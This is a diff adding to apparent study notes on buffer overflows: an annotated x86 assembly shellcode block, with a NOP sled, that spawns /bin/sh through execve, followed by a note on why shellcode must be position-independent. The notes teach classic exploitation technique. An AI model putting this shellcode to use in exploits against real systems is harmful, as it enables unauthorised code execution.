@@ -153,6 +153,28 @@ More recently a number of sites and tools have been developed to automate this p
 >	execve(sh, args, NULL);
 >}
 >```
+>
+>>[!info] Equivalent position-indipendent x86 assembly code
+>>```js
+>>       nop
+>>       nop                 //end of nop sled
+>>       jmp find            //jump to end of code
+>>cont: pop %esi            //pop address of sh off stack into esi
+>>       xor %eax, %eax      //zero contents of EAX
+>>       mov %al, 0x7(%esi)  //copy zero byte to end of string sh esi
+>>       lea (%esi), %ebx    //load address of sh (%esi) into %ebx
+>>       mov %ebx, 0x8(%esi) //save address of sh in args [0] (esi+8)
+>>       mov %eax, 0xc(%esi) //copy zero to args[1] (%esi+c)
+>>       mov $0xb, %al       //copy execve syscall number (11) to AL
+>>       mov %esi, %ebx      //copy address of sh (%esi) into ebx
+>>       lea 0x8(%esi), %ecx //copy address of args[0] (esi+8) to ecx
+>>       lea 0xc(%esi), %edx //copy address of args[1] (esi+c) to edx
+>>       int $0x80           //software interrupt to execute syscall
+>>find: call cont           //call cont that saves next addr on stack
+>>sh:   .string "/bin/sh "  //string constant
+>>args: .long 0             //space used for args array
+>>       .long 0             //args[1] and also NULL for env array
+>>```
 
 >[!warning] Shellcode caveats
 >It has to be position independent, so the shellcode must be able to run no matter where in memory it is located. The attacker in fact generally cannot determine in advance exactly where the targeted buffer will be located in the stack frame of the function in which it is defined, so only relative address references can be used (the attacker is not able to precisely specify the starting address of the instructions in the shellcode).
